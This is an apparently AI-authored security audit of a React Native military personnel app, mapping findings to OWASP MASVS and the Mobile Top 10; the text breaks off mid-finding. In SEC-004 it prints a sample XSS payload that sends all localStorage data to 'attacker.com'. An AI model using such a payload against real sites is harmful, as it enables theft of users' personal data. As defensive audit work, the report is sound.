# Security Audit Report -- My Compass

**Date:** 2026-03-28
**Auditor:** Claude Opus 4.6 (1M context)
**Scope:** Client-side codebase only (React Native / Expo)
**Classification:** For internal development use -- not a formal RMF assessment

---

## 1. Executive Summary

### 1.1 Threat Model Context

**Threat actors:**
- Nation-state adversaries targeting military personnel data (SSN, DoD ID, addresses, financial data, PCS movements)
- Insider threats with physical device access (lost/stolen government devices)
- Opportunistic attackers exploiting web deployment surface (XSS, data exfiltration via browser extensions)
- Supply chain attackers via compromised npm dependencies

**What they are after:**
- PII/CUI: SSNs, DoD IDs, emergency contacts, home addresses, dependent information, financial profiles, beneficiary data
- Operational patterns: PCS movement timelines, duty station assignments, leave schedules
- Session tokens for impersonation or lateral movement

**Attack surface:**
- Local storage (SQLite, localStorage, AsyncStorage) containing unencrypted PII
- Web deployment via Vercel exposing all data to browser-based attacks
- Deep link scheme (`mycompass://`) accepting unvalidated input
- Mock authentication flow with hardcoded token bypassing all real security
- 70+ npm dependencies with potential supply chain risk

### 1.2 Top 5 Vulnerabilities

1. **CRITICAL -- Encryption completely disabled** (`lib/encryption.ts:49-64`): Both `encryptData` and `decryptData` are no-ops returning plaintext. All "encrypted" fields (emergency contacts, leave defaults, session tokens on web) are stored in cleartext.

2. **CRITICAL -- Authentication is fully simulated** (`lib/ctx.tsx:56-84`): Sign-in flow uses a hardcoded `'mock-okta-access-token'` string. No real OIDC/PKCE flow, no token validation, no JWT verification. Any string grants full access.

3. **HIGH -- SQLite database is unencrypted** (`services/db/DatabaseManager.ts`): The database stores SSN-adjacent PII (DoD IDs, emergency contacts, addresses, financial data) with no SQLCipher or at-rest encryption. Physical device access exposes all data.

4. **HIGH -- Web platform stores PII in localStorage** (`lib/useStorageState.ts:18-25`, `services/storage.web.ts`): Session tokens and all user data including PII are stored in browser localStorage with encryption disabled, accessible to any XSS vector or browser extension.

5. **HIGH -- Encryption key management is insecure** (`lib/encryption.ts:10-39`): Even when encryption is re-enabled, keys fall through to `'fallback-session-key-' + timestamp` (predictable), are stored in plaintext in localStorage, or come from a public `EXPO_PUBLIC_` environment variable (embedded in client bundle).

### 1.3 Overall Security Posture Assessment

The codebase demonstrates **strong security awareness** in its architecture and documentation. The team has clearly planned for DISA STIG compliance, established PII handling policies, built a SecureLogger with global console patching, implemented session idle timeout (IA-11), DoD consent banner (AC-8), and an error boundary that suppresses raw error details (SI-11).

However, the **implementation gap is severe**. The two most critical security mechanisms -- encryption and authentication -- are either disabled or simulated. The app currently stores military PII in plaintext across all storage tiers. This is acceptable for the documented pre-ATO development phase, but every path to production requires addressing these findings.

**Risk rating: HIGH (pre-ATO development)** -- appropriate for current phase, but no production deployment is possible without remediating Critical and High findings.

---

## 2. OWASP MASVS v2 Control Assessment

### 2.1 MASVS-STORAGE

#### Sensitive data in local storage
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `lib/encryption.ts:49-64` | `encryptData()` and `decryptData()` return input unchanged |
| `services/db/DatabaseManager.ts:33` | SQLite opened without SQLCipher; no `PRAGMA key` |
| `services/repositories/UserRepository.ts:39-53` | DoD ID, email stored as plaintext in SQLite |
| `services/repositories/LeaveRepository.ts:46-48` | Emergency contact "encryption" calls disabled `encryptData()` |
| `services/storage.web.ts:40` | Full User object stored in localStorage via disabled `encryptData()` |
| `data/mockProfile.json:3-28` | Mock data contains realistic PII (DoD ID, phone, addresses, beneficiaries) committed to repo |

**Gap:** All PII is stored in cleartext. The encryption layer exists but is disabled. SQLite has no at-rest encryption. Web storage uses localStorage which is accessible to JavaScript running in the same origin.

#### Sensitive data in logs
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `app/_layout.tsx:16` | `SecureLogger.patchGlobalConsole()` called at app entry -- patches all console methods |
| `utils/logger.ts:15-18` | Redacts SSN (XXX-XX-XXXX), 10-digit numbers (DoD ID), and email patterns |
| `lib/ctx.tsx:63-66` | Logs OKTA_ISSUER, CLIENT_ID, REDIRECT_URI to console (safe -- not PII, but operational info) |
| `utils/logger.ts:48-51` | Objects passed to sanitizeArgs are returned raw without deep sanitization |

**Gap:** The global console patch is a strong control. However, `sanitizeArgs` does not recursively sanitize object properties -- if an object containing PII fields is logged, only the string representation is checked, not nested properties. The `typeof arg === 'object'` branch at line 48-51 returns the raw object. Phone numbers (non-10-digit) are not redacted. Full names are not redacted.

#### Sensitive data shared with third parties
**Status: Met (current phase)**

No third-party analytics, crash reporting, or telemetry SDKs are present. Push notification tokens are requested but no PII is sent with them.

#### Keyboard cache / clipboard / screenshots
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `package.json:25` | `expo-clipboard` is a dependency |
| No `secureTextEntry` usage found | PII input fields (SSN, phone, address) do not disable keyboard cache |
| No screenshot prevention | No `FLAG_SECURE` (Android) or screenshot blocking implemented |

**Gap:** No controls exist to prevent keyboard autocomplete from caching PII, clipboard from retaining sensitive data, or screenshots from capturing CUI screens.

#### Data backup exposure
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `app.json` | No `android:allowBackup="false"` configuration found |
| No iOS backup exclusion | SQLite database and AsyncStorage not excluded from iCloud/iTunes backup |

**Gap:** Device backups (iCloud, Android auto-backup) will include the unencrypted SQLite database and AsyncStorage containing PII.

#### Key management
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `lib/encryption.ts:12` | Key sourced from `EXPO_PUBLIC_STORAGE_KEY` -- public env vars are embedded in client bundles |
| `lib/encryption.ts:18-24` | Fallback: key generated and stored in plaintext in localStorage |
| `lib/encryption.ts:38` | Final fallback: `'fallback-session-key-' + new Date().getTime()` -- predictable, session-only |
| No PBKDF2, no KDF | No key derivation from user credentials |

**Gap:** The entire key management hierarchy is insecure. The "best" path uses a public environment variable readable from the client bundle. All fallbacks are worse.

---

### 2.2 MASVS-CRYPTO

#### Use of proven cryptographic primitives
**Status: Partially Met (design) / Not Met (implementation)**

| Evidence | Detail |
|----------|--------|
| `package.json:22` | `crypto-js` ^4.2.0 -- uses AES, which is a proven primitive |
| `lib/encryption.ts:49-64` | Implementation is disabled (returns plaintext) |

**Gap:** CryptoJS uses AES which is acceptable, but CryptoJS itself is a JavaScript implementation not validated to FIPS 140-2/3. For DoD systems, a FIPS-validated module is required per SC-13.

#### Cryptographic configuration
**Status: Not Met**

When encryption was active (commented code at `lib/encryption.ts:52`), it used `CryptoJS.AES.encrypt(data, ENCRYPTION_KEY)` with a string passphrase. CryptoJS derives a key from this passphrase using a non-standard EVP_BytesToKey derivation with MD5 -- this is not FIPS-compliant and uses a weak KDF.

#### Key generation and derivation
**Status: Not Met**

See MASVS-STORAGE Key Management above. No PBKDF2, no HKDF, no secure key derivation.

#### FIPS compliance status
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `package.json:22` | CryptoJS is not FIPS 140-2/3 validated |
| No native crypto | No use of platform-native crypto APIs (iOS CommonCrypto, Android Keystore) |

**Gap:** SC-13 requires FIPS-validated cryptographic modules for DoD systems. CryptoJS is a pure JavaScript implementation without FIPS certification.

#### Random number generation
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `package.json:56` | `react-native-get-random-values` polyfill imported in `lib/encryption.ts:2` |
| `lib/encryption.ts:24` | `CryptoJS.lib.WordArray.random(256/8)` -- uses the polyfilled CSPRNG |
| `services/syncQueue.ts:66` | `Math.random()` used for sync operation IDs (non-security, acceptable) |

**Gap:** The CSPRNG polyfill is present but only used for key generation (which is disabled). IDs generated with `Math.random()` are not cryptographic but are not used for security purposes.

---

### 2.3 MASVS-AUTH

#### Authentication mechanism strength
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `lib/ctx.tsx:56-84` | Entire auth flow is simulated with `setTimeout(1500)` |
| `lib/ctx.tsx:75` | `const mockAccessToken = 'mock-okta-access-token'` -- hardcoded string |
| `config/auth.ts:9` | Okta issuer URL points to non-existent `dev-navy-mock.okta.com` |
| No PKCE implementation | No `expo-auth-session` usage, no authorization code flow |

**Gap:** Authentication is completely simulated. No real identity verification occurs. This is documented as intentional for the pre-ATO phase.

#### Session management
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `hooks/useIdleTimeout.ts:6-9` | 5-min warning, 10-min hard sign-out (IA-11 compliant) |
| `app/_layout.tsx:64-67` | Idle timeout active only when authenticated AND consent acknowledged |
| `lib/ctx.tsx:41` | Consent state is in-memory only (resets per session -- AC-8 compliant) |
| No token expiration | Mock token has no TTL, no refresh logic |

**Gap:** Idle timeout is well-implemented. However, the session token itself has no expiration, no refresh mechanism, and no server-side validation. The token persists in secure store / localStorage indefinitely.

#### Token handling and refresh
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `lib/useStorageState.ts:28-34` | Native: token stored in expo-secure-store (appropriate tier) |
| `lib/useStorageState.ts:18-25` | Web: token stored in localStorage with disabled encryption |
| No JWT decode/validate | Token is treated as opaque string, never decoded or validated |
| No refresh flow | No token refresh, no expiration handling |

**Gap:** Token storage on native (expo-secure-store) is the correct tier. Web storage in localStorage is inappropriate for session tokens. No token validation or refresh exists.

#### Biometric authentication
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `app.json:26` | `NSFaceIDUsageDescription` is configured |
| No `expo-local-authentication` | The biometric library is not in dependencies |

**Gap:** Face ID usage description is declared but biometric authentication is not implemented. Documented as deferred in `docs/ATO_READINESS.md:257`.

#### Re-authentication for sensitive operations
**Status: Not Met**

No re-authentication is required for sensitive operations (viewing PII, submitting leave requests, submitting PCS data, viewing financial information).

---

### 2.4 MASVS-NETWORK

#### TLS configuration
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `config/api.ts:6` | Base URL uses `https://` scheme |
| `services/api/client.ts` | Standard `fetch()` -- relies on platform TLS stack |

**Gap:** HTTPS is configured as the base URL, which is correct. Platform TLS stacks handle cipher suite negotiation. No custom TLS configuration exists (acceptable for managed Expo workflow). No TLS minimum version enforcement.

#### Certificate validation / pinning
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `services/api/client.ts` | No certificate pinning implementation |
| `docs/ATO_READINESS.md:78` | SRG-APP-000380 explicitly marked as not implemented |

**Gap:** No certificate pinning. Documented as blocked on backend certificate provisioning.

#### API endpoint security
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `services/api/client.ts:160-165` | Auth token injection via Bearer header |
| `services/api/client.ts:120-134` | Retry with exponential backoff and jitter |
| `services/api/client.ts:180-184` | Timeout with AbortController (30s) |

**Gap:** The HTTP client is well-designed with retry, timeout, and auth injection. Currently only used with mock services. No request signing or HMAC.

#### Data in transit protection
**Status: Not Met (web) / Partially Met (native)**

On native platforms, `fetch()` uses the platform TLS stack. On web, data transits over HTTPS but the Vercel deployment has no HSTS configuration visible in the codebase. All mock service calls are local (no actual transit).

---

### 2.5 MASVS-PLATFORM

#### Platform permission usage
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `app.json:22-27` | iOS permissions with appropriate usage descriptions |
| `app.json:39-42` | Android: `CAMERA` and `RECORD_AUDIO` requested |

**Gap:** `RECORD_AUDIO` permission is declared but no audio recording feature exists in the codebase. This is an overprivileged permission that should be removed (principle of least privilege). `NSContactsUsageDescription` is declared but contact access features are not implemented.

#### Deep link validation
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `app.json:8` | `mycompass://` scheme registered |
| `config/auth.ts:15` | `mycompass://auth` used as redirect URI |
| No deep link validation | No input sanitization on deep link parameters |

**Gap:** The `mycompass://` scheme accepts deep links but there is no validation of incoming URL parameters. Malicious deep links could potentially redirect to arbitrary routes.

#### IPC security
**Status: Not Applicable**

No custom IPC mechanisms (ContentProviders, BroadcastReceivers, custom URL handlers beyond Expo Router).

#### WebView security
**Status: Not Applicable**

No WebView usage found in the codebase (only references in documentation for future planning).

#### Custom URL scheme handling
**Status: Partially Met**

Expo Router handles routing via the `mycompass://` scheme. Route protection is implemented via `AuthGuard.tsx`, but the guard does not validate URL parameters or sanitize route segments.

---

### 2.6 MASVS-CODE

#### Input validation
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `types/schema.ts` | Comprehensive Zod schemas defined for all domain types |
| `types/user.ts:107-215` | UserSchema with field-level validation |
| `services/repositories/LeaveRepository.ts:164` | `LeaveRequestSchema.parse()` validates on read from DB |
| `services/repositories/UserRepository.ts:70` | `UserSchema.parse()` validates on read from DB |
| `services/storage.web.ts` | No Zod validation on web storage reads (raw `JSON.parse`) |
| `services/db/DatabaseManager.ts:64` | `WebHelpers.getItem` does raw `JSON.parse` without validation |

**Gap:** Zod schemas are comprehensive and used at the SQLite repository boundary. However, the web storage implementation (`storage.web.ts`, `DatabaseManager.ts:WebHelpers`) performs raw `JSON.parse` without Zod validation, creating an inconsistent trust boundary. The `WebLeaveRepository` at `services/repositories/LeaveRepository.ts:323-358` also bypasses Zod validation entirely.

#### Code obfuscation
**Status: Not Met**

No code obfuscation configured. Expo managed workflow does not include Hermes bytecode obfuscation by default for web builds. The web bundle is standard JavaScript.

#### Debug detection
**Status: Not Met**

| Evidence | Detail |
|----------|--------|
| `app.json:76` | `"enableDevSettings": true` in production config |
| `components/navigation/DrawerMenuContent.tsx:15` | Dev settings exposed when `enableDevSettings` is true |
| `components/pcs/PCSDevPanel.tsx:38` | Dev panel visible when `enableDevSettings || __DEV__` |

**Gap:** `enableDevSettings: true` is hardcoded in `app.json` extra config and will be present in production builds. This exposes developer-only UI (dev panels, demo mode controls) to end users.

#### Integrity verification
**Status: Not Met**

No runtime integrity checks, no code signing verification, no jailbreak/root detection.

#### Third-party library security
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `package.json` | 70+ dependencies |
| `crypto-js` | Known to have CVE-2023-46233 (PBKDF2 weakness) in older versions; v4.2.0 addresses some issues but is not FIPS-validated |

**Gap:** No automated dependency vulnerability scanning (no `npm audit` in CI, no Snyk/Dependabot configured). The dependency count is moderate but includes security-relevant packages (crypto-js, expo-secure-store, expo-sqlite) that require monitoring.

---

### 2.7 MASVS-RESILIENCE

#### Anti-tampering mechanisms
**Status: Not Met**

No anti-tampering controls implemented.

#### Runtime integrity checks
**Status: Not Met**

No runtime integrity verification.

#### Device integrity verification
**Status: Not Met**

No jailbreak/root detection. No SafetyNet/Play Integrity attestation. No deviceCheck.

#### Anti-reverse engineering
**Status: Not Met**

No obfuscation, no anti-debugging, no string encryption.

---

### 2.8 MASVS-PRIVACY

#### PII inventory and handling
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `types/user.ts:109-146` | PII fields annotated with `@security PII - STRICTLY FORBIDDEN IN LOGS` JSDoc |
| `CLAUDE.md` Rule 4.5 | PII fields explicitly enumerated |
| `data/mockProfile.json` | Realistic PII in committed mock data (names, addresses, phone numbers, DoD ID) |

**Gap:** PII is well-inventoried and annotated. The mock data file contains realistic-looking PII committed to the repository. While labeled as mock, the format and structure could be mistaken for real data.

#### Data minimization
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `store/useUserStore.ts:179-201` | Granular selector hooks prevent over-fetching in components |
| `services/repositories/UserRepository.ts:32-37` | Only a subset of User fields persisted to SQLite |

**Gap:** User profile contains extensive PII (beneficiaries, PADD, blood type, dependent DOBs) that may not all be needed client-side. Consider whether all fields need local persistence.

#### User consent management
**Status: Met**

| Evidence | Detail |
|----------|--------|
| `app/consent.tsx` | DoD Notice and Consent banner (AC-8) with standard boilerplate |
| `lib/ctx.tsx:41` | Consent state is in-memory only, resets every session |
| `components/navigation/AuthGuard.tsx:44-48` | Consent required before accessing protected routes |

**Gap:** None for current requirements. Consent is properly required per-session and cannot be bypassed (except in demo mode).

#### Data retention policies
**Status: Not Met**

No data retention policies implemented. No automatic data purging. No data lifecycle management. SQLite data persists indefinitely.

#### Privacy-by-design patterns
**Status: Partially Met**

| Evidence | Detail |
|----------|--------|
| `types/user.ts:206` | `privacyMode` field exists for UI masking |
| `store/CLAUDE.md:88` | "Never store auth tokens or raw PII in Zustand state" |
| Zustand stores | User store holds full PII in memory for the lifetime of the app session |

**Gap:** Privacy mode exists for UI display. However, the full User object (including all PII) is held in Zustand state in memory throughout the session, accessible to any component.

---

## 3. OWASP Mobile Top 10 (2024) Mapping

### M1: Improper Credential Usage
**Risk Level: CRITICAL**

| Evidence | Impact |
|----------|--------|
| `lib/ctx.tsx:75` | Hardcoded `'mock-okta-access-token'` bypasses authentication |
| `lib/encryption.ts:38` | Predictable fallback encryption key |
| `lib/encryption.ts:12` | `EXPO_PUBLIC_*` env var for encryption key (embedded in client bundle) |
| `config/auth.ts:12` | `CLIENT_ID = 'my-compass-client'` -- placeholder, not a secret but indicates no real OAuth config |

**Impact:** No real credential verification exists. Any user can access the app. All credential-adjacent values are placeholders. The encryption key management makes any future encryption trivially breakable.

### M2: Inadequate Supply Chain Security
**Risk Level: MEDIUM**

| Evidence | Impact |
|----------|--------|
| `package.json` | 70+ runtime dependencies; no lock file integrity checks in CI |
| No `.npmrc` | No registry restrictions (could pull from public npm) |
| `crypto-js` | Community-maintained crypto library, not a first-party or FIPS-validated solution |
| `.github/workflows/` | CI exists but no `npm audit` step visible |

**Impact:** A compromised dependency could exfiltrate PII. For a DoD app, all dependencies should be vetted and preferably sourced from a trusted registry.

### M3: Insecure Authentication/Authorization
**Risk Level: CRITICAL**

| Evidence | Impact |
|----------|--------|
| `lib/ctx.tsx:56-84` | Authentication is simulated -- no real OIDC flow |
| `components/navigation/AuthGuard.tsx` | Route guard checks session string existence, not validity |
| No RBAC/ABAC | No role-based access control; all authenticated users see everything |
| Demo mode bypass | `AuthGuard.tsx:38` -- demo mode implicitly acknowledges consent |

**Impact:** No authentication or authorization is enforced. Any session string grants full access to all features and data.

### M4: Insufficient Input/Output Validation
**Risk Level: MEDIUM**

| Evidence | Impact |
|----------|--------|
| `services/repositories/LeaveRepository.ts:164` | Zod validation on SQLite reads (good) |
| `services/storage.web.ts` | No Zod validation on web reads (bad) |
| `services/db/DatabaseManager.ts:64` | `WebHelpers.getItem` does raw JSON.parse |
| `services/migrations.ts:146,187` | String interpolation in SQL: `'${new Date().toISOString()}'` |
| `components/assignment/SelectionDetailWidget.tsx:83` | `Linking.openURL(tel:${...})` with unsanitized phone numbers |

**Impact:** Inconsistent validation boundaries between native and web. SQL string interpolation in migrations (low risk since values are from `Date.toISOString()`, not user input). Deep links and URL schemes accept unsanitized input.

### M5: Insecure Communication
**Risk Level: LOW (current) / HIGH (production)**

| Evidence | Impact |
|----------|--------|
| `config/api.ts:6` | HTTPS base URL configured |
| No certificate pinning | Vulnerable to MITM with rogue CA |
| All services are mock | No actual network communication currently |

**Impact:** Currently low risk as no real API calls are made. When real services are connected, the lack of certificate pinning becomes a significant risk for a military application.

### M6: Inadequate Privacy Controls
**Risk Level: HIGH**

| Evidence | Impact |
|----------|--------|
| All PII stored in plaintext | SSN-adjacent data (DoD ID, addresses, financial info) unprotected at rest |
| No data retention policy | PII persists indefinitely on device |
| No screenshot prevention | Screens showing CUI can be captured |
| `data/mockProfile.json` | Realistic PII patterns in committed source code |

**Impact:** A lost or stolen device exposes all cached PII. No controls prevent screenshots of sensitive screens.

### M7: Insufficient Binary Protections
**Risk Level: MEDIUM**

| Evidence | Impact |
|----------|--------|
| No jailbreak/root detection | App runs on compromised devices without warning |
| No code obfuscation | JavaScript bundle is readable |
| No anti-tampering | Modified app binaries not detected |
| `app.json:76` | `enableDevSettings: true` exposes dev UI in production |

**Impact:** Reverse engineering is trivial. Dev panels accessible in production builds. No detection of compromised runtime environment.

### M8: Security Misconfiguration
**Risk Level: HIGH**

| Evidence | Impact |
|----------|--------|
| `app.json:76` | `enableDevSettings: true` hardcoded |
| `app.json:41` | `RECORD_AUDIO` permission without audio features |
| `app.json:32` | `usesNonExemptEncryption: false` -- may be incorrect if encryption is re-enabled |
| `eas.json:50-52` | `appleId: "matthewcla@gmail.com"` -- personal email in build config |
| `.gitignore:37` | Only `.env*.local` ignored; `.env` itself would be committed |
| No Android backup restriction | Device backups include unencrypted data |

**Impact:** Dev settings exposed to end users. Overprivileged permissions. Personal developer email in build configuration. Potential for .env file to be committed.

### M9: Insecure Data Storage
**Risk Level: CRITICAL**

| Evidence | Impact |
|----------|--------|
| `lib/encryption.ts:49-64` | Encryption disabled (no-op functions) |
| `services/db/DatabaseManager.ts:33` | Unencrypted SQLite database |
| `lib/useStorageState.ts:18-25` | Web: session token in localStorage |
| `services/storage.web.ts` | All PII in localStorage on web |
| `services/syncQueue.ts:30` | Sync queue payloads (potentially containing PII) in AsyncStorage |

**Impact:** All data is stored in plaintext. Physical device access or web XSS exposes everything. This is the most severe finding for a military personnel app.

### M10: Insufficient Cryptography
**Risk Level: CRITICAL**

| Evidence | Impact |
|----------|--------|
| `lib/encryption.ts:49-64` | Encryption implementation disabled |
| `lib/encryption.ts:10-39` | Insecure key management even when enabled |
| `crypto-js` | Not FIPS 140-2/3 validated |
| CryptoJS AES with string key | Uses weak EVP_BytesToKey/MD5 key derivation |

**Impact:** No cryptographic protection exists. When re-enabled, the implementation will use non-FIPS crypto with weak key derivation and insecure key storage.

---

## 4. Vulnerability Findings

### SEC-001: Encryption Completely Disabled

| Field | Content |
|-------|---------|
| **ID** | SEC-001 |
| **Title** | AES encryption functions are no-ops returning plaintext |
| **MASVS Control** | MASVS-CRYPTO-1, MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M9, M10 |
| **Severity** | Critical |
| **Description** | Both `encryptData()` and `decryptData()` in `lib/encryption.ts` have their implementations commented out and return the input string unchanged. All code paths that call these functions (session token storage on web, emergency contact encryption in leave requests, leave defaults encryption, web storage encryption) are effectively storing plaintext. |
| **Evidence** | `lib/encryption.ts:49-51` (`encryptData` returns `data`), `lib/encryption.ts:63-64` (`decryptData` returns `data`), `services/repositories/LeaveRepository.ts:48` (calls `encryptData` on emergency contact), `lib/useStorageState.ts:24` (calls `encryptData` on session token for web) |
| **Attack Scenario** | An attacker with physical access to the device extracts the SQLite database or localStorage and reads all PII including DoD IDs, emergency contacts, addresses, and financial data in plaintext. On web, any XSS vulnerability or malicious browser extension can read all localStorage data. |
| **Remediation** | Re-enable encryption implementation. Replace CryptoJS with a FIPS 140-2/3 validated library (e.g., native platform crypto via `expo-crypto` or a validated WebCrypto wrapper). Implement proper key management using `expo-secure-store` to store derived keys on native, and consider Web Crypto API with non-extractable keys for web. |
| **Effort** | L |
| **Dependencies** | Client-only (can be done without backend) |

### SEC-002: Authentication Fully Simulated

| Field | Content |
|-------|---------|
| **ID** | SEC-002 |
| **Title** | Sign-in flow uses hardcoded mock token with no real OIDC |
| **MASVS Control** | MASVS-AUTH-1 |
| **OWASP Mobile Top 10** | M1, M3 |
| **Severity** | Critical |
| **Description** | The `signInWithOkta()` function in `lib/ctx.tsx` simulates authentication by sleeping for 1.5 seconds and setting `session` to the string `'mock-okta-access-token'`. There is no real Okta integration, no PKCE flow, no token verification, and no JWT decoding. The `AuthGuard` only checks if a session string exists, not its validity. |
| **Evidence** | `lib/ctx.tsx:75` (hardcoded mock token), `lib/ctx.tsx:68-71` (simulated delay), `config/auth.ts:9` (fake Okta URL `dev-navy-mock.okta.com`), `components/navigation/AuthGuard.tsx:41` (checks `!session` only) |
| **Attack Scenario** | Not applicable in current mock state, but when production auth is implemented: if the token validation remains a simple truthy check, any non-empty string in storage would grant access. |
| **Remediation** | Implement real OIDC Authorization Code flow with PKCE using `expo-auth-session`. Validate JWT tokens (signature, issuer, audience, expiration) on receipt. Implement token refresh. Connect to a real Okta/Keycloak tenant. Add server-side token validation for all API calls. |
| **Effort** | L |
| **Dependencies** | Backend required (Okta tenant provisioning, token validation endpoint) |

### SEC-003: SQLite Database Unencrypted

| Field | Content |
|-------|---------|
| **ID** | SEC-003 |
| **Title** | SQLite database stores PII without at-rest encryption |
| **MASVS Control** | MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M9 |
| **Severity** | High |
| **Description** | The SQLite database (`my_compass.db`) is opened via `SQLite.openDatabaseAsync(DB_NAME)` without any encryption. It stores DoD IDs, email addresses, leave addresses, phone numbers, emergency contacts (partially), duty station information, and approval chain data. |
| **Evidence** | `services/db/DatabaseManager.ts:33` (no encryption config), `types/schema.ts:104-118` (users table with dod_id, email), `types/schema.ts:226-262` (leave_requests with phone, address, emergency_contact) |
| **Attack Scenario** | An attacker with physical device access (lost/stolen device, forensic analysis) can extract the SQLite database file and read all contents. On a jailbroken/rooted device, any app with elevated privileges can access the database. |
| **Remediation** | Implement SQLCipher encryption for the SQLite database. Derive the encryption key from user credentials or device-bound key stored in the platform secure enclave. Use `PRAGMA key` on database open. Consider `expo-sqlite`'s encryption support or switch to a SQLCipher-backed library. |
| **Effort** | M |
| **Dependencies** | Client-only |

### SEC-004: Web Platform Stores PII in localStorage

| Field | Content |
|-------|---------|
| **ID** | SEC-004 |
| **Title** | All user data and session tokens stored in browser localStorage without encryption |
| **MASVS Control** | MASVS-STORAGE-1, MASVS-AUTH-2 |
| **OWASP Mobile Top 10** | M9 |
| **Severity** | High |
| **Description** | On the web platform, `useStorageState.ts` stores session tokens in localStorage. `storage.web.ts` stores the complete User object (including DoD ID, addresses, emergency contacts, financial profile, beneficiaries, dependents) in localStorage. The `encryptData()` wrapper is disabled, so all data is plaintext. |
| **Evidence** | `lib/useStorageState.ts:24` (session token to localStorage), `services/storage.web.ts:40` (full User to localStorage), `services/storage.web.ts:66` (billets), `services/storage.web.ts:110` (applications) |
| **Attack Scenario** | An XSS vulnerability, malicious browser extension, or shared computer scenario exposes all PII. localStorage is synchronous and accessible to any JavaScript running in the same origin. An attacker could inject `<script>fetch('attacker.com',{method:'POST',body:JSON.stringify(localStorage)})</script>` to exfiltrate all data. |
| **Remediation** | For web: use IndexedDB with encryption via Web Crypto API (non-extractable keys). For session tokens on web: use `httpOnly` cookies (requires backend). Minimize PII stored client-side on web. Consider whether web deployment should be restricted to non-PII views only. |
| **Effort** | M |
| **Dependencies** | Client-only (encryption). Backend required for httpOnly cookies. |

### SEC-005: Insecure Encryption Key Management

| Field | Content |
|-------|---------|
| **ID** | SEC-005 |
| **Title** | Encryption key hierarchy uses predictable, public, or plaintext-stored keys |
| **MASVS Control** | MASVS-CRYPTO-2, MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M10 |
| **Severity** | High |
| **Description** | The key hierarchy in `lib/encryption.ts` has three tiers, all insecure: (1) `EXPO_PUBLIC_STORAGE_KEY` environment variable is embedded in the client bundle and visible to anyone decompiling the app; (2) a randomly generated key stored in plaintext in localStorage; (3) `'fallback-session-key-' + timestamp` which is predictable and session-bound. |
| **Evidence** | `lib/encryption.ts:12` (EXPO_PUBLIC env var), `lib/encryption.ts:18-24` (localStorage key), `lib/encryption.ts:38` (fallback key) |
| **Attack Scenario** | An attacker decompiles the app bundle and reads the EXPO_PUBLIC key. All "encrypted" data across all installations using that key is decryptable. For web, the key in localStorage is trivially readable alongside the encrypted data. |
| **Remediation** | On native: derive encryption key from user credentials via PBKDF2 with high iteration count, store derived key in expo-secure-store (backed by Keychain/Keystore). On web: use Web Crypto API to generate non-extractable CryptoKey objects. Never use EXPO_PUBLIC for secrets. Remove the fallback key entirely. |
| **Effort** | M |
| **Dependencies** | Client-only |

### SEC-006: Dev Settings Exposed in Production Builds

| Field | Content |
|-------|---------|
| **ID** | SEC-006 |
| **Title** | `enableDevSettings: true` in app.json exposes developer panels to end users |
| **MASVS Control** | MASVS-CODE-3 |
| **OWASP Mobile Top 10** | M8 |
| **Severity** | High |
| **Description** | `app.json` hardcodes `"enableDevSettings": true` in the `extra` configuration. This flag is checked by `DrawerMenuContent.tsx:15` and `PCSDevPanel.tsx:38` to show developer-only UI elements. Since `app.json` is baked into all builds, production users will see dev panels, demo mode toggles, and debugging tools. |
| **Evidence** | `app.json:76`, `components/navigation/DrawerMenuContent.tsx:15,35`, `components/pcs/PCSDevPanel.tsx:35-38` |
| **Attack Scenario** | End users discover dev panels, toggle demo mode, manipulate PCS phase overrides, and potentially corrupt their own data. More critically, dev panels may expose internal state, user IDs, or debugging information not intended for end users. |
| **Remediation** | Set `"enableDevSettings": false` in `app.json` for production. Better: remove the flag entirely from `app.json` and rely solely on `__DEV__` which is automatically false in production builds. Add build-time stripping of dev panel components using `babel-plugin-transform-remove-console` or similar. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-007: PII Logger Sanitization Incomplete

| Field | Content |
|-------|---------|
| **ID** | SEC-007 |
| **Title** | SecureLogger does not deeply sanitize objects and misses some PII patterns |
| **MASVS Control** | MASVS-STORAGE-2 |
| **OWASP Mobile Top 10** | M6 |
| **Severity** | Medium |
| **Description** | `SecureLogger.sanitizeArgs()` only sanitizes string arguments and Error messages. When an object is passed (line 48-51 of `utils/logger.ts`), it is returned as-is without recursive property sanitization. This means `SecureLogger.error('[Store] failed', { user })` would log the full user object with all PII. Additionally, the regex patterns miss: phone numbers not in 10-digit format (e.g., 757-555-0142), full names, and street addresses. |
| **Evidence** | `utils/logger.ts:48-51` (objects returned raw), `utils/logger.ts:15-17` (SSN and email patterns only), `store/usePCSStore.ts:260` (`console.error` bypasses SecureLogger despite global patch -- but global patch is active, so this is mitigated by the patch) |
| **Attack Scenario** | A developer logs `SecureLogger.error('Failed', { request })` where `request` contains an emergency contact object with name, phone, and address. The object is logged without sanitization to the device console or crash reporting service. |
| **Remediation** | Modify `sanitizeArgs` to recursively walk object properties and sanitize string values. Add regex patterns for phone numbers (various formats), addresses (street + city + state + zip patterns), and consider a PII field allowlist approach where only explicitly safe fields are logged. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-008: Console.log Bypasses in Pre-Patch Code

| Field | Content |
|-------|---------|
| **ID** | SEC-008 |
| **Title** | Console.log statements in lib/ctx.tsx execute before global console patch |
| **MASVS Control** | MASVS-STORAGE-2 |
